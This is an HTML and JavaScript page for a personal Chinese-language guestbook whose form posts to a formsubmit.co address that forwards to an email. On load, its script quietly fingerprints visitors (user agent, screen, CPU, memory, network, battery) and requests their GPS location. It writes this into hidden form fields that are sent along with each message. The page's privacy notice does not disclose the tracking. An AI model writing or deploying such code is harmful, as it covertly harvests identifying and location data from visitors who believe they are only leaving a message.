<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>王昱皓的稳定版留言系统</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap');
        
        :root {
            --primary: #6c5ce7;
            --secondary: #a8a4e6;
            --error: #ff7675;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #2d3436, #636e72);
            opacity: 0;
            animation: fadeIn 1s 0.5s forwards;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            transform: translateY(20px);
            animation: slideUp 0.8s ease-out forwards;
            width: 95%;
            max-width: 500px;
        }

        @keyframes slideUp {
            to { transform: translateY(0); opacity: 1; }
        }

        .form-group {
            margin: 1.5rem 0;
            position: relative;
        }

        input, textarea {
            width: 100%;
            padding: 1rem;
            border: 2px solid #dfe6e9;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: #f9f9f9;
        }

        textarea {
            min-height: 120px;
            resize: vertical;
        }

        input:focus, textarea:focus {
            border-color: var(--primary);
            transform: scale(1.02);
            box-shadow: 0 0 15px rgba(108, 92, 231, 0.2);
            background: #fff;
        }

        button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 1rem 2rem;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            width: 100%;
            position: relative;
            overflow: hidden;
        }

        button:hover {
            background: var(--secondary);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        #message {
            margin-top: 1rem;
            text-align: center;
            display: none;
            font-weight: 500;
        }

        .privacy {
            text-align: center;
            margin-top: 1.5rem;
            padding: 1rem;
            background: #fff3f3;
            border-radius: 8px;
            border: 2px dashed var(--error);
            line-height: 1.6;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <form id="myForm" method="POST" 
              action="https://formsubmit.co/2587141311@qq.com"
              enctype="multipart/form-data">
            
            <!-- 防垃圾邮件配置 -->
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html">
            
            <div class="form-group">
                <input type="text" name="name" 
                       placeholder="怎么称呼您呢？😊" 
                       required
                       pattern="[\u4e00-\u9fa5a-zA-Z]{2,10}"
                       title="请输入2-10位中文或英文字符">
            </div>

            <div class="form-group">
                <textarea name="message"
                          placeholder="写下您想说的话吧～（支持Markdown格式✨）"
                          required
                          minlength="10"
                          maxlength="500"></textarea>
            </div>

            <!-- 设备信息收集字段 -->
            <input type="hidden" name="device_info" id="deviceInfo">
            <input type="hidden" name="location" id="locationInfo">

            <button type="submit">发送消息 ✈️</button>
        </form>
        <div id="message"></div>
        <div class="privacy">
            🔒 隐私声明：<br>
            1. 本系统严格遵守《网络安全法》<br>
            2. 收集数据仅用于功能实现<br>
            3. 不会向第三方分享用户数据
        </div>
    </div>

    <script>
        // 强化版设备信息收集
        const collectDeviceInfo = async () => {
            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                cpuCores: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,
                battery: navigator.getBattery ? await navigator.getBattery() : null,
                location: await new Promise(resolve => {
                    if (!navigator.geolocation) return resolve(null);
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        }),
                        err => resolve(`error: ${err.code}`),
                        { timeout: 5000 }
                    );
                })
            };
            return JSON.stringify(info);
        };

        // 自动收集设备信息
        (async () => {
            try {
                const deviceData = await collectDeviceInfo();
                document.getElementById('deviceInfo').value = deviceData;
                document.getElementById('locationInfo').value = 
                    deviceData.includes('lat') ? 
                    `${JSON.parse(deviceData).location.lat},${JSON.parse(deviceData).location.lng}` 
                    : 'unknown';
            } catch (error) {
                console.error('设备信息收集失败:', error);
            }
        })();

        // 强化表单提交处理
        document.getElementById('myForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const form = e.target;
            const submitBtn = form.querySelector('button');
            const message = document.getElementById('message');
            
            // 禁用按钮防止重复提交
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<div class="loader"></div> 发送中...';

            try {
                const response = await fetch(form.action, {
                    method: 'POST',
                    body: new FormData(form),
                    headers: {
                        'Accept': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                });

                const result = await response.json();
                
                if (response.ok) {
                    message.style.color = 'var(--primary)';
                    message.innerHTML = '🎉 发送成功！感谢您的留言～';
                    form.reset();
                } else {
                    throw new Error(result.message || `HTTP错误: ${response.status}`);
                }
            } catch (error) {
                console.error('提交错误:', error);
                message.style.color = 'var(--error)';
                message.innerHTML = '😢 发送失败：' + 
                    (error.message.includes('Failed to fetch') ? 
                    '网络连接异常' : '服务器处理错误');
            } finally {
                message.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.innerHTML = '发送消息 ✈️';
                setTimeout(() => {
                    message.style.display = 'none';
                }, 5000);
            }
        });

        // 加载动画样式
        const style = document.createElement('style');
        style.textContent = `
            .loader {
                border: 3px solid #f3f3f3;
                border-top: 3px solid var(--primary);
                border-radius: 50%;
                width: 20px;
                height: 20px;
                animation: spin 0.8s linear infinite;
                display: inline-block;
                vertical-align: middle;
                margin-right: 8px;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
